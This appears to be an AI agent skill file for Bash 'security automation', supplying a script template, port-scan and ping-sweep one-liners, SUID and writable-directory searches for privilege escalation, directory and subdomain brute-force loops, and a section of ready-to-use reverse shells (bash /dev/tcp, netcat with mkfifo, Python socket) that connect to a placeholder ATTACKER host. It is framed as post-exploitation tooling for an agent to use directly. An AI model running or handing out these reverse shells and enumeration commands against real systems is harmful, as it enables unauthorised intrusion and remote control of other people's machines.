---
name: bash-automation
description: >-
  Bash scripting for security automation. One-liners, enumeration, 
  post-exploitation. Use for quick scripts and automation tasks.
---

# Bash Security Automation

## Script Template

```bash
#!/bin/bash
set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[-]${NC} $1"; exit 1; }

usage() {
    cat << EOF
Usage: $(basename $0) <target> [options]
  -o FILE    Output file
  -t NUM     Threads (default: 10)
  -v         Verbose
EOF
    exit 1
}

[[ $# -lt 1 ]] && usage
TARGET=$1
shift

while getopts "o:t:vh" opt; do
    case $opt in
        o) OUTPUT="$OPTARG" ;;
        t) THREADS="$OPTARG" ;;
        v) VERBOSE=1 ;;
        *) usage ;;
    esac
done

log "Starting scan on $TARGET"
# Main logic here
```

## Useful One-Liners

```bash
# Port scan without nmap
for p in {1..1000}; do 
    (echo >/dev/tcp/$IP/$p) 2>/dev/null && echo "$p open"
done

# Ping sweep
for i in {1..254}; do 
    ping -c1 -W1 192.168.1.$i &>/dev/null && echo "192.168.1.$i up"
done | sort -t. -k4 -n

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find writable directories
find / -writable -type d 2>/dev/null

# Extract URLs
grep -Eo 'https?://[^ ]+' file.txt | sort -u

# Parallel execution
cat targets.txt | xargs -P10 -I{} curl -s -o /dev/null -w "%{http_code} {}\n" {}
```

## Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Netcat
nc -e /bin/sh ATTACKER PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER PORT >/tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## Enumeration Snippets

```bash
# Web directory check
while read path; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "$URL/$path")
    [[ $code != "404" ]] && echo "$code $path"
done < wordlist.txt

# Subdomain brute
while read sub; do
    host "$sub.$DOMAIN" 2>/dev/null | grep "has address" && echo "$sub.$DOMAIN"
done < subdomains.txt
```
